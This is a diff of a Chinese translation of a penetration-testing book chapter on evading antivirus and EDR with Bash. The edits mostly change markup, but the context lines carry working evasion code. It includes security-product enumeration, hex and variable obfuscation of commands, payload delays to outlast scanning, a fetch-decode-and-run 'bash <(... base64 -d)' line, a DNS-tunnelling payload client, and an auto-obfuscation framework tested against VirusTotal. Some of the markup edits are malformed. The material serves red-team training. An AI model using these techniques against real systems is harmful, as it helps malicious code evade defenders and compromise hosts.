@@ -50,7 +50,7 @@
 
 让我们首先来看一下进程枚举：
 
-1.  主要的方法之一是检查正在运行的进程。这可以通过使用像**ps**、**top**或**htop**这样的命令来完成。
+1.  主要的方法之一是检查正在运行的进程。这可以通过使用像`ps`、`top`或`htop`这样的命令来完成。
 
     以下展示了如何列出所有运行中的进程：
 
@@ -64,7 +64,7 @@
     $ sudo ps aux | grep -E "(av|edr|protect|defend|guard)"
     ```
 
-    由于**av**和**edr**字符串较短，输出可能会有许多假阳性，因为它们可能匹配其他无关的词汇。请仔细审查输出。
+    由于`av`和`edr`字符串较短，输出可能会有许多假阳性，因为它们可能匹配其他无关的词汇。请仔细审查输出。
 
 1.  文件系统分析是端点保护软件枚举的另一个重要方面，即检查与 AV/EDR 解决方案相关的特定文件或目录是否存在。
 
@@ -154,7 +154,7 @@
     $ env | grep -E "(AV|EDR|PROTECT)"
     ```
 
-在 Bash 脚本中实现这些技术时，重要的是将多种方法结合使用，以实现全面的防护。这里有一个简单的示例，结合了几种方法。你可以在本章的 GitHub 仓库中找到名为**ch14_gather_basic_info.sh**的代码：
+在 Bash 脚本中实现这些技术时，重要的是将多种方法结合使用，以实现全面的防护。这里有一个简单的示例，结合了几种方法。你可以在本章的 GitHub 仓库中找到名为`ch14_gather_basic_info.sh`的代码：
 
 ```
  #!/usr/bin/env bash
@@ -176,7 +176,7 @@ lsmod | grep -E "(av|edr|protect)"
 echo "Enumeration complete."
 ```
 
-AV 和 EDR 软件会发送有关端点状态、性能和活动的数据。这被称为**遥测**。以下脚本检查主机是否将遥测数据发送到常见的 EDR 域。你可以在本章的 GitHub 仓库中找到名为**ch14_telemetry_check.sh**的脚本：
+AV 和 EDR 软件会发送有关端点状态、性能和活动的数据。这被称为**遥测**。以下脚本检查主机是否将遥测数据发送到常见的 EDR 域。你可以在本章的 GitHub 仓库中找到名为`ch14_telemetry_check.sh`的脚本：
 
 ```
  #!/usr/bin/env bash
@@ -228,11 +228,11 @@ echo "Hello, World!"
 $(printf "\x65\x63\x68\x6f") "$(printf "\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21")"
 ```
 
-**printf**命令使用命令替换，并显示**Hello World**的十六进制表示。
+`printf`命令使用命令替换，并显示`Hello World`的十六进制表示。
 
 两个脚本产生相同的输出，但第二个脚本在第一眼看上去要更难阅读。
 
-下一个示例使用基本的变量替换来运行**sudo -l**命令，该命令被 EDR 代理检测到：
+下一个示例使用基本的变量替换来运行`sudo -l`命令，该命令被 EDR 代理检测到：
 
 ```
  cmd="sudo"
@@ -240,7 +240,7 @@ args="-l"
 $cmd $args
 ```
 
-我们可以使用**prin tf**进行更高级的命令替换，如这里所示：
+我们可以使用`prin tf`进行更高级的命令替换，如这里所示：
 
 ```
  $ (printf '\x73\x75\x64\x6f') $(printf '\x2d\x6c')
@@ -273,7 +273,7 @@ $ $CMD_PART1$CMD_PART2 $ARG
  $ {s,u,d,o}" "-{l}
 ```
 
-以下示例实现了使用**cut**的命令替换：
+以下示例实现了使用`cut`的命令替换：
 
 ```
  $ $(cut -c1-4 <<< "sudo sudo") $(cut -c1-2 <<< "-l -l")
@@ -285,7 +285,7 @@ $ $CMD_PART1$CMD_PART2 $ARG
  $ $(printf "\x$(printf '%x' 115)\x$(printf '%x' 117)\x$(printf '%x' 100)\x$(printf '%x' 111)") $(printf "\x$(printf '%x' 45)\x$(printf '%x' 108)")
 ```
 
-这些方法中的每一种以不同的方式混淆**sudo -l**命令。这些技术可以结合使用或嵌套起来，以创造出更复杂的混淆。然而，重要的是要注意，现代安全解决方案通常能够检测到这些混淆尝试。这些方法在面对简单的模式匹配时更为有效，也被称为**基于签名的** **检测系统**。
+这些方法中的每一种以不同的方式混淆`sudo -l`命令。这些技术可以结合使用或嵌套起来，以创造出更复杂的混淆。然而，重要的是要注意，现代安全解决方案通常能够检测到这些混淆尝试。这些方法在面对简单的模式匹配时更为有效，也被称为**基于签名的` `检测系统**。
 
 在针对 EDR 系统测试这些混淆技术时，请观察每种方法如何影响检测率。一些 EDR 解决方案可能会检测到某些混淆技术，而忽略其他技术。这些信息对于理解被测试 EDR 系统的能力和局限性非常有价值。
 
@@ -299,9 +299,9 @@ $ $CMD_PART1$CMD_PART2 $ARG
 
 提示
 
-AV 和 EDR 供应商已经开始意识到简单的睡眠语句的使用。通常需要使用比调用**sleep()**函数更复杂的技术，例如在检查经过了多少时间之前执行一些随机任务。
+AV 和 EDR 供应商已经开始意识到简单的睡眠语句的使用。通常需要使用比调用`sleep()`函数更复杂的技术，例如在检查经过了多少时间之前执行一些随机任务。
 
-以下脚本示例避免使用 sleep 语句，而是通过执行无害活动和检查以确保时间在凌晨 1 点到 3 点之间，才执行有效载荷。它可以在本章的 GitHub 仓库中找到，文件名为 **ch14_sleep_1.sh**：
+以下脚本示例避免使用 sleep 语句，而是通过执行无害活动和检查以确保时间在凌晨 1 点到 3 点之间，才执行有效载荷。它可以在本章的 GitHub 仓库中找到，文件名为 `ch14_sleep_1.sh`：
 
 ```
  #!/usr/bin/env bash
@@ -314,11 +314,11 @@ else
     echo "System check completed." fi
 ```
 
-或者，你可以使用 **sleep 600** 命令在执行有效载荷之前让程序休眠 10 分钟。此外，你还可以通过从 HTTPS URL 获取有效载荷并在 sleep 语句后解码或解密它，来使检测变得更加困难，而不是将其存储在脚本中。大多数防病毒系统最初会扫描文件并找不到恶意内容的证据，然后不会检测到任何恶意活动，最终停止监控该文件。
+或者，你可以使用 `sleep 600` 命令在执行有效载荷之前让程序休眠 10 分钟。此外，你还可以通过从 HTTPS URL 获取有效载荷并在 sleep 语句后解码或解密它，来使检测变得更加困难，而不是将其存储在脚本中。大多数防病毒系统最初会扫描文件并找不到恶意内容的证据，然后不会检测到任何恶意活动，最终停止监控该文件。
 
 在 EDR 环境下，如果检测到文件、进程或网络签名，简单的 sleep 语句可能不足以避开检测。在这种情况下，你可以通过将活动分散到多个命令或步骤中，并在每个步骤之间插入时间，来避免检测。在特定时间范围内发生的多个攻击链动作可能会触发高风险或严重警报。然而，如果在动作之间插入足够的时间，你可能能够避开检测，或者每个步骤可能会以较低的严重性警报，避免被防御者注意。
 
-脚本已被修改，在每个步骤之间插入了时间。以下脚本可以在本章的 GitHub 仓库中找到，文件名为 **ch14_sleep_2.sh**：
+脚本已被修改，在每个步骤之间插入了时间。以下脚本可以在本章的 GitHub 仓库中找到，文件名为 `ch14_sleep_2.sh`：
 
 ```
  #!/usr/bin/env bash
@@ -334,9 +334,9 @@ sleep 7200
 bash <(echo "$decrypted_payload" | base64 -d)
 ```
 
-如果你想更加隐蔽，应该避免使用 **curl** 或 **wget** 来获取有效载荷，而是使用 DNS。以下示例包含了用于通过 DNS 传输数据的服务器端和客户端代码。你可以在 Bash 脚本中实现客户端代码，替换任何使用 **curl** 或 **wget** 的地方。
+如果你想更加隐蔽，应该避免使用 `curl` 或 `wget` 来获取有效载荷，而是使用 DNS。以下示例包含了用于通过 DNS 传输数据的服务器端和客户端代码。你可以在 Bash 脚本中实现客户端代码，替换任何使用 `curl` 或 `wget` 的地方。
 
-服务器端代码可以在本章的 GitHub 仓库中找到，文件名为 **ch14_dns_server.py**。客户端代码可以在本章的 GitHub 仓库中找到，文件名为 **ch14_dns_client.sh**：
+服务器端代码可以在本章的 GitHub 仓库中找到，文件名为 `ch14_dns_server.py`。客户端代码可以在本章的 GitHub 仓库中找到，文件名为 `ch14_dns_client.sh`：
 
 ```
  #!/usr/bin/env bash
@@ -376,49 +376,49 @@ retrieve_data "nonexistent"
 
 你需要自己编辑服务器端和客户端代码，修改以发送适合渗透测试操作的有效载荷。这只是一个框架。你可以在传输数据之前对其进行编码或加密，然后在客户端进行解码或解密，并完全在内存中运行代码以避免写入磁盘。
 
-以下是 **retrieve_data** 函数代码的解释：
+以下是 `retrieve_data` 函数代码的解释：
 
-+   **local key="$1"** ：这一行声明了一个本地变量 **key**，并将其赋值为传递给函数的第一个参数的值。
++   `local key="$1"` ：这一行声明了一个本地变量 `key`，并将其赋值为传递给函数的第一个参数的值。
 
-+   **echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"** ：这一行打印出发送的查询内容。
++   `echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"` ：这一行打印出发送的查询内容。
 
-+   **local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")** ：这是函数的核心，使用**dig**命令执行 DNS 查询。让我们分解一下：
++   `local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")` ：这是函数的核心，使用`dig`命令执行 DNS 查询。让我们分解一下：
 
-    +   **dig** ：这是一个 DNS 查询工具。
+    +   `dig` ：这是一个 DNS 查询工具。
 
-    +   **@$SERVER_IP** ：这个变量指定了要查询的 DNS 服务器（你自定义的服务器）。
+    +   `@$SERVER_IP` ：这个变量指定了要查询的 DNS 服务器（你自定义的服务器）。
 
-    +   **+short** ：这告诉**dig**给出简洁的答案。对于**TXT**记录，它只返回文本数据。
+    +   `+short` ：这告诉`dig`给出简洁的答案。对于`TXT`记录，它只返回文本数据。
 
-    +   **TXT** ：这指定我们正在查找**TXT**记录。
+    +   `TXT` ：这指定我们正在查找`TXT`记录。
 
-    +   **"$key.get.$DOMAIN"** ：这是我们查询的完整域名，包含了**key**变量、**get**字眼和**DOMAIN**变量。
+    +   `"$key.get.$DOMAIN"` ：这是我们查询的完整域名，包含了`key`变量、`get`字眼和`DOMAIN`变量。
 
-    +   整个命令被包裹在**$()**中，这是命令替换。它运行命令并返回输出，然后将其分配给**result**变量。
+    +   整个命令被包裹在`$()`中，这是命令替换。它运行命令并返回输出，然后将其分配给`result`变量。
 
-+   **if [ -n "$result" ]; then** ：这检查**result**变量是否非空。
++   `if [ -n "$result" ]; then` ：这检查`result`变量是否非空。
 
-+   在**if**语句块内部，我们有以下内容：
++   在`if`语句块内部，我们有以下内容：
 
-    +   **local decoded=$(echo $result | tr -d '"' | base64 -d 2>/dev/null)** ：这一行处理结果：
+    +   `local decoded=$(echo $result | tr -d '"' | base64 -d 2>/dev/null)` ：这一行处理结果：
 
-        +   **echo $result** ：输出结果
+        +   `echo $result` ：输出结果
 
-        +   **tr -d '"'** ：移除任何引号字符
+        +   `tr -d '"'` ：移除任何引号字符
 
-        +   **base64 -d** ：解码 Base64 编码的字符串
+        +   `base64 -d` ：解码 Base64 编码的字符串
 
-        +   **2>/dev/null** ：将任何错误信息重定向到**/dev/null**（丢弃它们）
+        +   `2>/dev/null` ：将任何错误信息重定向到`/dev/null`（丢弃它们）
 
-+   **if [ $? -eq 0 ]; then** ：这检查之前的命令（Base64 解码）是否成功：
++   `if [ $? -eq 0 ]; then` ：这检查之前的命令（Base64 解码）是否成功：
 
     +   如果成功，它将打印解码后的数据。如果失败，它将打印错误信息和原始数据。
 
-    +   如果**result**为空，它会打印**No data found** **for '{$key}'**。
+    +   如果`result`为空，它会打印`No data found** **for '{$key}'`。
 
     +   最后，输出一个分隔符行。
 
-**dig** 命令在这里非常重要。它使用 DNS 传输数据，查询一个包含我们关心的密钥的**TXT**记录的域名。服务器会在**TXT**记录中返回 Base64 编码的数据，客户端随后进行解码。
+`dig` 命令在这里非常重要。它使用 DNS 传输数据，查询一个包含我们关心的密钥的`TXT`记录的域名。服务器会在`TXT`记录中返回 Base64 编码的数据，客户端随后进行解码。
 
 这种使用 DNS 进行数据传输的方法有时被称为**DNS 隧道**或**DNS 外泄**。这是利用一种通常被防火墙允许的协议（DNS）来传输数据的创意方式，即使其他协议被阻止时，仍然可以通过该协议进行数据传输。
 
@@ -428,7 +428,7 @@ retrieve_data "nonexistent"
 
 为了自动化生成混淆的 Bash 脚本，我们将创建一个简单的框架，结合多种规避技术。这个框架将帮助我们快速生成更有可能避开 AV 和 EDR 系统检测的脚本。
 
-这是我们框架的基本结构。以下代码可以在本章的 GitHub 仓库中找到，文件名为**ch14_auto_obfuscate_1.sh**。我将把代码分解成小部分并进行解释：
+这是我们框架的基本结构。以下代码可以在本章的 GitHub 仓库中找到，文件名为`ch14_auto_obfuscate_1.sh`。我将把代码分解成小部分并进行解释：
 
 ```
  #!/usr/bin/env bash
@@ -438,7 +438,7 @@ encode_base64() {
 }
 ```
 
-上面的代码块提供了一个函数来对传递给该函数的任何数据进行 Base64 编码。在代码的下一部分，提供了一个函数，使用**openssl**程序生成由四位十六进制字符组成的随机变量名：
+上面的代码块提供了一个函数来对传递给该函数的任何数据进行 Base64 编码。在代码的下一部分，提供了一个函数，使用`openssl`程序生成由四位十六进制字符组成的随机变量名：
 
 ```
  # Function to obfuscate variable names
@@ -447,7 +447,7 @@ obfuscate_var_name() {
 }
 ```
 
-然后，Bash 代码将**cmd**变量的内容转换为一个没有空格和换行符的十六进制字符串表示：
+然后，Bash 代码将`cmd`变量的内容转换为一个没有空格和换行符的十六进制字符串表示：
 
 ```
  # Function to obfuscate a command using command substitution
@@ -457,13 +457,13 @@ obfuscate_command() {
 }
 ```
 
-这里介绍了**od**工具。它用于以各种格式输出数据。**od -A n -t x1**命令用于以特定格式显示文件或输入的内容。以下是详细说明：
+这里介绍了`od`工具。它用于以各种格式输出数据。`od -A n -t x1`命令用于以特定格式显示文件或输入的内容。以下是详细说明：
 
-+   **od**：这是**octal dump**的缩写，是一个命令行工具，用于以各种格式显示数据。
++   `od`：这是`octal dump`的缩写，是一个命令行工具，用于以各种格式显示数据。
 
-+   **-A n**：该选项指定输出中不显示地址（偏移量）。
++   `-A n`：该选项指定输出中不显示地址（偏移量）。
 
-+   **-t x1**：这表示显示格式。**x**指定十六进制格式，**1**表示 1 字节单位。这意味着数据将以每个字节的两位十六进制数字显示。
++   `-t x1`：这表示显示格式。`x`指定十六进制格式，`1`表示 1 字节单位。这意味着数据将以每个字节的两位十六进制数字显示。
 
 以下代码声明了重要变量，然后逐行读取原始脚本：
 
@@ -509,15 +509,15 @@ obfuscated_script=$(generate_obfuscated_script "$original_script")
 echo "$obfuscated_script" > obfuscated_script.sh
 ```
 
-然后，它基于**generate_obfuscated_script**函数的返回值声明了一个混淆脚本的变量。该变量的内容随后会被保存到**obfuscated_script.sh**文件中。
+然后，它基于`generate_obfuscated_script`函数的返回值声明了一个混淆脚本的变量。该变量的内容随后会被保存到`obfuscated_script.sh`文件中。
 
-该脚本提供了一个生成混淆 Bash 脚本的基本框架。它包括编码字符串、混淆变量名和混淆命令的函数。主要的**generate_obfuscated_script**函数读取原始脚本，应用各种混淆技术，并生成一个混淆后的版本。
+该脚本提供了一个生成混淆 Bash 脚本的基本框架。它包括编码字符串、混淆变量名和混淆命令的函数。主要的`generate_obfuscated_script`函数读取原始脚本，应用各种混淆技术，并生成一个混淆后的版本。
 
 该脚本通过逐行读取原始脚本来工作。对于每一行，它检查是否可以对某些变量赋值或命令进行混淆。变量名会被替换成随机生成的名称，命令会被转换成十六进制表示，并在运行时解码。
 
 为了使我们的框架更加灵活和可扩展，我们可以实现模块化的混淆技术。该方法使我们能够轻松添加新的混淆方法或以不同的方式组合现有方法。
 
-下面是如何修改我们的框架以支持模块化混淆技术的示例。该脚本可以在 GitHub 仓库中找到，文件名为**ch14_auto_obfuscate_2.sh**：
+下面是如何修改我们的框架以支持模块化混淆技术的示例。该脚本可以在 GitHub 仓库中找到，文件名为`ch14_auto_obfuscate_2.sh`：
 
 ```
  #!/usr/bin/env bash
@@ -553,7 +553,7 @@ add_obfuscation_technique obfuscate_hex
 add_obfuscation_technique obfuscate_eval
 ```
 
-在前面的代码段中，我们选择了我们的混淆技术并将其添加到**obfuscation_techniques**数组中。
+在前面的代码段中，我们选择了我们的混淆技术并将其添加到`obfuscation_techniques`数组中。
 
 ```
  # Function to apply a random obfuscation technique
@@ -565,7 +565,7 @@ apply_random_obfuscation() {
 }
 ```
 
-在前面的代码中，**apply_random_obfuscation**函数会随机选择一种技术，然后调用该技术的函数并将原始脚本内容传入函数调用中。
+在前面的代码中，`apply_random_obfuscation`函数会随机选择一种技术，然后调用该技术的函数并将原始脚本内容传入函数调用中。
 
 ```
  # Main function to generate an obfuscated script
@@ -580,7 +580,7 @@ generate_obfuscated_script() {
 }
 ```
 
-在前面的代码块中，**generate_obfuscated_script**函数逐行处理原始脚本，在每一行上调用**apply_random_obfuscation**函数。每次函数调用的输出会被追加到**obfuscated_script**变量中，然后打印到终端。
+在前面的代码块中，`generate_obfuscated_script`函数逐行处理原始脚本，在每一行上调用`apply_random_obfuscation`函数。每次函数调用的输出会被追加到`obfuscated_script`变量中，然后打印到终端。
 
 ```
  # Usage
@@ -591,7 +591,7 @@ echo "$obfuscated_script" > obfuscated_script.sh
 
 在前面的代码中，调用了之前声明的函数，最终会将混淆后的脚本保存到一个文件中。
 
-这个更新后的框架引入了一系列混淆技术，并提供了一个函数用于添加新的技术。**apply_random_obfuscation**函数会随机选择一种技术应用到脚本的每一行。这个模块化方法使得在不改变脚本生成器核心逻辑的情况下，轻松地添加新的混淆方法或修改现有的混淆方法。
+这个更新后的框架引入了一系列混淆技术，并提供了一个函数用于添加新的技术。`apply_random_obfuscation`函数会随机选择一种技术应用到脚本的每一行。这个模块化方法使得在不改变脚本生成器核心逻辑的情况下，轻松地添加新的混淆方法或修改现有的混淆方法。
 
 为了进一步增强我们的框架，我们可以创建一个独立的规避函数库。这个库将包含我们已经介绍的各种混淆和规避技术，可以被导入并在我们的主脚本生成器中使用。
 
@@ -601,13 +601,13 @@ echo "$obfuscated_script" > obfuscated_script.sh
  source ch14_evasion_library.sh
 ```
 
-这一点在**ch14_auto_obfuscate_4.sh**脚本中得到了展示，脚本可以在本章的 GitHub 仓库中找到。由于它与以前的版本非常相似，唯一的区别是从外部脚本引用了规避函数，因此这里不会显示完整的代码。
+这一点在`ch14_auto_obfuscate_4.sh`脚本中得到了展示，脚本可以在本章的 GitHub 仓库中找到。由于它与以前的版本非常相似，唯一的区别是从外部脚本引用了规避函数，因此这里不会显示完整的代码。
 
 这种方法使我们能够维护一个单独的规避函数库，方便管理、更新和扩展我们的混淆技术集合。
 
 为了使我们的混淆过程更加动态和不可预测，我们可以开发一个脚本，针对原始脚本中的每一行或命令结合多种规避方法。这个方法增加了混淆脚本的复杂性，使得检测系统更难分析。
 
-下面是如何修改我们的脚本生成器以动态地结合规避方法的示例。此示例在以下脚本中演示，脚本文件名为**ch14_auto_obfuscate_5.sh**，可以在 GitHub 仓库中找到：
+下面是如何修改我们的脚本生成器以动态地结合规避方法的示例。此示例在以下脚本中演示，脚本文件名为`ch14_auto_obfuscate_5.sh`，可以在 GitHub 仓库中找到：
 
 ```
  #!/usr/bin/env bash
@@ -630,7 +630,7 @@ apply_multiple_obfuscations() {
 }
 ```
 
-前面代码中**apply_multiple_obfuscations**函数与以前版本的主要区别在于，它可以使用 1 到 3 种混淆技术，而不是仅使用 1 种。
+前面代码中`apply_multiple_obfuscations`函数与以前版本的主要区别在于，它可以使用 1 到 3 种混淆技术，而不是仅使用 1 种。
 
 ```
  # Main function to generate an obfuscated script
@@ -649,7 +649,7 @@ generate_obfuscated_script() {
 }
 ```
 
-在前面的代码中，原始脚本代码按行处理并传递给**apply_multiple_obfuscations**函数。一旦函数处理完数据并应用了混淆，它会将结果附加到**obfuscated_script**变量中。
+在前面的代码中，原始脚本代码按行处理并传递给`apply_multiple_obfuscations`函数。一旦函数处理完数据并应用了混淆，它会将结果附加到`obfuscated_script`变量中。
 
 ```
  # Usage
@@ -658,11 +658,11 @@ obfuscated_script=$(generate_obfuscated_script "$original_script")
 echo "$obfuscated_script" > obfuscated_script.sh
 ```
 
-这个更新后的脚本引入了**apply_multiple_obfuscations**函数，该函数对脚本的每一行应用随机数量的混淆技术。此方法创建了更复杂和多样化的混淆模式，使得识别模式或签名变得更加困难。
+这个更新后的脚本引入了`apply_multiple_obfuscations`函数，该函数对脚本的每一行应用随机数量的混淆技术。此方法创建了更复杂和多样化的混淆模式，使得识别模式或签名变得更加困难。
 
 生成混淆脚本后，重要的是对它们进行测试并验证它们在常见的 AV 和 EDR 产品中的表现。这个过程有助于确保我们的混淆技术有效，并根据结果优化我们的方法。
 
-下面是一个基本的脚本，演示了我们如何测试混淆脚本。它可以在 GitHub 仓库中找到，文件名是**ch14_auto_obfuscate_6.sh**。你需要获得一个 VirusTotal API 密钥，并在运行脚本前替换**YOUR_API_KEY**字符串。你可以在[`docs.virustotal.com/docs/please-give-me-an-api-key`](https://docs.virustotal.com/docs/please-give-me-an-api-key)找到获取 API 密钥的说明：
+下面是一个基本的脚本，演示了我们如何测试混淆脚本。它可以在 GitHub 仓库中找到，文件名是`ch14_auto_obfuscate_6.sh`。你需要获得一个 VirusTotal API 密钥，并在运行脚本前替换`YOUR_API_KEY`字符串。你可以在[`docs.virustotal.com/docs/please-give-me-an-api-key`](https://docs.virustotal.com/docs/please-give-me-an-api-key)找到获取 API 密钥的说明：
 
 ```
  #!/usr/bin/env bash
@@ -680,7 +680,7 @@ test_script() {
 }
 ```
 
-上述代码块中的**test_script**函数负责使用 ClamAV 软件进行扫描，并检查 VirusTotal 网站上的检测结果。
+上述代码块中的`test_script`函数负责使用 ClamAV 软件进行扫描，并检查 VirusTotal 网站上的检测结果。
 
 ```
  # Generate and test multiple variations of obfuscated scripts
@@ -707,9 +707,9 @@ num_variations=5
 generate_and_test "$original_script" "$num_variations"
 ```
 
-这个脚本演示了测试混淆脚本的基本方法。**test_script**函数模拟了将脚本与不同的 AV/EDR 解决方案进行测试。在实际场景中，你将用 AV/EDR 产品或在线扫描服务的实际扫描替代这些模拟。
+这个脚本演示了测试混淆脚本的基本方法。`test_script`函数模拟了将脚本与不同的 AV/EDR 解决方案进行测试。在实际场景中，你将用 AV/EDR 产品或在线扫描服务的实际扫描替代这些模拟。
 
-**generate_and_test**函数生成多个混淆脚本变种，并对每个变种进行测试。这样，我们可以看到不同混淆技术组合在检测系统中的表现。
+`generate_and_test`函数生成多个混淆脚本变种，并对每个变种进行测试。这样，我们可以看到不同混淆技术组合在检测系统中的表现。
 
 该脚本生成指定数量的混淆变种，并通过测试过程对它们进行测试，提供每个变种的结果。
 
